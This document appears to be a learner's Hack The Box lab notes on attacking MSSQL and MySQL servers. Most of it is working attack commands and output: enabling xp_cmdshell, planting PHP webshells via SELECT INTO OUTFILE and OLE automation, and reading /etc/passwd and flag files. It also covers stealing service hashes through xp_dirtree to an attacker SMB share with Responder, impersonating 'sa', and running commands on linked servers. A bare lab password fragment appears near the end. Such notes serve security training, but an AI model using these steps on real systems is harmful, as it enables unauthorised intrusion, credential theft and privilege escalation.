
Structured Query Language (SQL)

1- its stores all kind of data
2- gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.


MSSQL <> `TCP/1433`
MSSQL <> `UDP/1434`
MySQL <> `TCP/3306`

## Authentication Mechanisms
MSSQL supports two authentication modes

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |

vulns:
```
`MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.
```


#### Misconfigurations
anonymous access is enabled

#### Privileges
- Read or change the contents of a database
    
- Read or change the server configuration
    
- Execute commands
    
- Read local files
    
- Communicate with other databases
    
- Capture the local system hash
    
- Impersonate existing users
    
- Gain access to other networks

---
## 1-#### Read/Change the Database

```
identify existing databases on the server, what tables the database contains, and finally, the contents of each table.
```
note:
```
if the database conatin alot of tables, we must focus on the important tables:
---
usernames,
passwords, 
tokens, 
configurations
---
```
step-2
mysql:linux
```shell-session
AhmaDb0x@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
```
sqlcmd:windows
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
MSSQL:linux
```shell-session
AhmaDb0x@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```
```shell-session
AhmaDb0x@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
```

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:
```shell-session
AhmaDb0x@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

```shell-session
mysql> SHOW DATABASES;
```
```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

```shell-session
mysql> USE htbusers;
```
```cmd-session
1> USE htbusers
2> GO
```


```shell-session
mysql> SHOW TABLES;
```
```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```


```shell-session
mysql> SELECT * FROM users;
```
```cmd-session
1> SELECT * FROM users
2> go
```

## 2-####Execute Commands

##### MSSQL
---

MSSQL has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. Keep in mind the following about xp_cmdshell:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the `Policy-Based Management` or by executing `sp_configure`
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

#### XP_CMDSHELL
```cmd-session
1> xp_cmdshell 'whoami'
2> GO
```

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

`xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

---

## Write Local Files
we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using `SELECT INTO OUTFILE` in the webserver directory. Then we can browse to the location where the file is and execute our commands.
#### MySQL - Write Local File
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```


In `MySQL`, a global system variable `secure_file_priv` limits the effect of data import and export operations,
`secure_file_priv` may be set as follows:
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```



#### MSSQL - Write Local File

MSSQL - Enable Ole Automation Procedures which require admin `prives`
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
write:
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files

#### Read Local Files in MSSQL

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

#### MySQL - Read Local Files in MySQL
```shell-session
mysql> select LOAD_FILE("/etc/passwd");
select LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
```


## Capture MSSQL Service Hash
#### XP_DIRTREE Hash Stealing
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.14.112\share\'
2> GO
```

#### XP_SUBDIRS Hash Stealing
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

#### XP_SUBDIRS Hash Stealing with Responder
```shell-session
AhmaDb0x@htb[/htb]$ sudo responder -I tun0
```
#### XP_SUBDIRS Hash Stealing with impacket
```shell-session
AhmaDb0x@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
```

## Impersonate Existing Users with MSSQL
#### Identify Users that We Can Impersonate
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin
```
#### Verifying our Current User and Role
```cmd-session
> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio

 0

```
value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user.
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1
```
**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`

`MSSQL` default system schemas/databases:
`master` - keeps the information for an instance of SQL Server.

We can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.


## Communicate with Other Databases with MSSQL
`MSSQL` has a configuration option called `linked servers.` Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.
```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```
As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server.


```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```
https://www.hack-notes.pro/academy-hackthebox/attacking-common-services/attacking-common-services-hard


EXECUTE ('EXEC xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''')

princess1 mssqlsvc

```
EXECUTE('
EXEC sp_configure ''show advanced options'', 1;
RECONFIGURE;
EXEC sp_configure ''xp_cmdshell'', 1;
RECONFIGURE;
EXEC xp_cmdshell ''whoami''
 ') AT [LOCAL.TEST.LINKED.SRV];
 go
```



 SELECT * FROM OPENROWSET(BULK N'c:\users\administartor\desktop\flag.txt', SINGLE_CLOB) AS Contents